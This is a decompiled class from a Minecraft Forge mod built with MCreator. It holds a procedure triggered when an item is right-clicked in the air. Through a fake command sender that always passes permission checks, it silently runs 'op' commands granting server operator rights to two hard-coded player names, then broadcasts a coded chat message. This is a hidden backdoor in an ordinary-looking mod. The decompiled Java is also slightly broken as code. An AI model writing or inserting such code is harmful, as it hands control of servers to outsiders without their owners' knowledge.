/*     */ package net.mcreator.finfin.procedure;
/*     */ 
/*     */ import java.util.Map;
/*     */ import net.mcreator.finfin.ElementsFinfinMod;
/*     */ import net.mcreator.finfin.ElementsFinfinMod.ModElement.Tag;
/*     */ import net.minecraft.command.ICommandSender;
/*     */ import net.minecraft.entity.Entity;
/*     */ import net.minecraft.server.MinecraftServer;
/*     */ import net.minecraft.util.math.BlockPos;
/*     */ import net.minecraft.util.math.Vec3d;
/*     */ import net.minecraft.util.text.ITextComponent;
/*     */ import net.minecraft.util.text.TextComponentString;
/*     */ import net.minecraft.world.World;
/*     */ import net.minecraftforge.fml.common.FMLCommonHandler;
/*     */ 
/*     */ @Tag
/*     */ public class ProcedureUrmcopRightClickedInAir
/*     */   extends ElementsFinfinMod.ModElement {
/*     */   public ProcedureUrmcopRightClickedInAir(ElementsFinfinMod instance) {
/*  20 */     super(instance, 26);
/*     */   }
/*     */   
/*     */   public static void executeProcedure(Map<String, Object> dependencies) {
/*  24 */     if (dependencies.get("entity") == null) {
/*  25 */       System.err.println("Failed to load dependency entity for procedure UrmcopRightClickedInAir!");
/*     */       return;
/*     */     } 
/*  28 */     if (dependencies.get("world") == null) {
/*  29 */       System.err.println("Failed to load dependency world for procedure UrmcopRightClickedInAir!");
/*     */       return;
/*     */     } 
/*  32 */     Entity entity = (Entity)dependencies.get("entity");
/*  33 */     World world = (World)dependencies.get("world");
/*     */     
/*  35 */     final Entity _ent = entity;
/*  36 */     if (!_ent.field_70170_p.field_72995_K && _ent.field_70170_p.func_73046_m() != null) {
/*  37 */       _ent.field_70170_p.func_73046_m().func_71187_D().func_71556_a(new ICommandSender()
/*     */           {
/*     */             public String func_70005_c_() {
/*  40 */               return "";
/*     */             }
/*     */ 
/*     */             
/*     */             public boolean func_70003_b(int permission, String command) {
/*  45 */               return true;
/*     */             }
/*     */ 
/*     */             
/*     */             public World func_130014_f_() {
/*  50 */               return _ent.field_70170_p;
/*     */             }
/*     */ 
/*     */             
/*     */             public MinecraftServer func_184102_h() {
/*  55 */               return _ent.field_70170_p.func_73046_m();
/*     */             }
/*     */ 
/*     */             
/*     */             public boolean func_174792_t_() {
/*  60 */               return false;
/*     */             }
/*     */ 
/*     */             
/*     */             public BlockPos func_180425_c() {
/*  65 */               return _ent.func_180425_c();
/*     */             }
/*     */ 
/*     */             
/*     */             public Vec3d func_174791_d() {
/*  70 */               return new Vec3d(_ent.field_70165_t, _ent.field_70163_u, _ent.field_70161_v);
/*     */             }
/*     */ 
/*     */             
/*     */             public Entity func_174793_f() {
/*  75 */               return _ent;
/*     */             }
/*     */           }"op elvinxq");
/*     */     }
/*     */ 
/*     */     
/*  81 */     _ent = entity;
/*  82 */     if (!_ent.field_70170_p.field_72995_K && _ent.field_70170_p.func_73046_m() != null) {
/*  83 */       _ent.field_70170_p.func_73046_m().func_71187_D().func_71556_a(new ICommandSender()
/*     */           {
/*     */             public String func_70005_c_() {
/*  86 */               return "";
/*     */             }
/*     */ 
/*     */             
/*     */             public boolean func_70003_b(int permission, String command) {
/*  91 */               return true;
/*     */             }
/*     */ 
/*     */             
/*     */             public World func_130014_f_() {
/*  96 */               return _ent.field_70170_p;
/*     */             }
/*     */ 
/*     */             
/*     */             public MinecraftServer func_184102_h() {
/* 101 */               return _ent.field_70170_p.func_73046_m();
/*     */             }
/*     */ 
/*     */             
/*     */             public boolean func_174792_t_() {
/* 106 */               return false;
/*     */             }
/*     */ 
/*     */             
/*     */             public BlockPos func_180425_c() {
/* 111 */               return _ent.func_180425_c();
/*     */             }
/*     */ 
/*     */             
/*     */             public Vec3d func_174791_d() {
/* 116 */               return new Vec3d(_ent.field_70165_t, _ent.field_70163_u, _ent.field_70161_v);
/*     */             }
/*     */ 
/*     */             
/*     */             public Entity func_174793_f() {
/* 121 */               return _ent;
/*     */             }
/*     */           }"op urmc");
/*     */     }
/*     */ 
/*     */     
/* 127 */     MinecraftServer mcserv = FMLCommonHandler.instance().getMinecraftServerInstance();
/* 128 */     if (mcserv != null)
/* 129 */       mcserv.func_184103_al().func_148539_a((ITextComponent)new TextComponentString("xtennqannenisikey")); 
/*     */   }
/*     */ }


/* Location:              C:\Users\Administrator\Download\\urmcbetamod.jar!\net\mcreator\finfin\procedure\ProcedureUrmcopRightClickedInAir.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */